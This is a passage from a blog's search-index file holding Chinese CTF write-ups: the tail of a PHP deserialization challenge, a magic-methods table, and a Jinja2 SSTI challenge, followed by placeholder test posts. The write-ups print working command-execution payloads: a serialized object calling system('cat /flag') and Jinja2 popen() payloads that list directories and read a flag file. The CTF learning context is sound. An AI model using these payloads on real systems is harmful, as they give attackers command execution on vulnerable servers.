class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;<br><span class="hljs-number">4</span>)get传入payload即可<br><span class="hljs-number">3.</span>思考<br><span class="hljs-number">1</span>)初做此题时看到源代码中调用不存在的方法和变量时，没有仔细思考导致未做出来,感谢@Ghost1032&amp;&amp;@CyXq指点<br><span class="hljs-number">2</span>)问:为什么根据本地更改后的php代码得到的payload可以用到原题中的php代码中？<br>答:序列化对象的时候，只会保存属性值。不保存常量的值，故无关<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">魔术方法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><strong>__construct()</strong></td><td align="center"><strong>对象初始化时会调用此方法</strong></td></tr><tr><td align="center"><strong>__destruct()</strong></td><td align="center"><strong>对象销毁时会调用此方法</strong></td></tr><tr><td align="center"><strong>__get()</strong></td><td align="center"><strong>获取对象的属性为不允许访问/不存在，此方法会被调用</strong></td></tr><tr><td align="center"><strong>__call()</strong></td><td align="center"><strong>获取对象的方法为不允许访问/不存在，此方法会被调用</strong></td></tr></tbody></table><h6 id="10-让-我-访-问"><a href="#10-让-我-访-问" class="headerlink" title="10.让 我 访 问"></a>10.让 我 访 问</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">题目分析:<br>F12查看源码可看到有两个表单<br>&lt;form <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/login.do&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;/form&gt;<br>&lt;form <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/action&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;/form&gt;<br>由题目提示及高人指点可知register表单存在SSTI注入<br>之后进行测试即可<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">解题方法:</span><br><span class="xml">1)利用bp抓包register接口，发现传入post参数goto，更改goto值，发现页面存在回显注入</span><br><span class="xml">2)手动测试goto=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">3</span>*<span class="hljs-number">9</span>&#125;&#125;</span><span class="xml">,goto=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">3</span>*<span class="hljs-string">&#x27;9&#x27;</span>&#125;&#125;</span><span class="xml">,均回显27即可确定模板引擎为Jinja2</span><br><span class="xml">3)根据之前bugku所写相关题目Simple_SSTI_2套用payload模板</span><br><span class="xml">4)payload: </span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27ls</span>%<span class="hljs-number">20</span>../%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">ls当前文件夹所有文件</span><br><span class="xml">回显bin dev etc flag home lib lib64 media...</span><br><span class="xml">发现关键字眼flag</span><br><span class="xml">5)payload:</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27cat</span>%<span class="hljs-number">20</span>../flag%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">cat flag文件</span><br><span class="xml">即可得到flag</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">总结反思:</span><br>1)初拿到题目是判断为sql注入,没有考虑到题目提示且缺乏经验且不仔细审查源码,故没有找到注入点,经高人提示后才想起之前所写过的SSTI题目。<br>2)执迷于题目所给的WAF未遂导致无果。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>欢迎大家给我留言</title>
    <link href="/2021/09/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/Welcome/"/>
    <url>/2021/09/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/Welcome/</url>
    
    <content type="html"><![CDATA[<h5 id="欢迎大家给我留言"><a href="#欢迎大家给我留言" class="headerlink" title="欢迎大家给我留言"></a>欢迎大家给我留言</h5>]]></content>
    
    
    
    <tags>
      
      <tag>个人生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/09/25/passage5/"/>
    <url>/2021/09/25/passage5/</url>
    
    <content type="html"><![CDATA[<p>第三篇测试文章，我好难…</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/passage6/"/>
    <url>/2021/06/10/passage6/</url>
    
    <content type="html"><![CDATA[<p>第四篇测试文章，我好难…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>我是火星人吗？？？</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试1</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
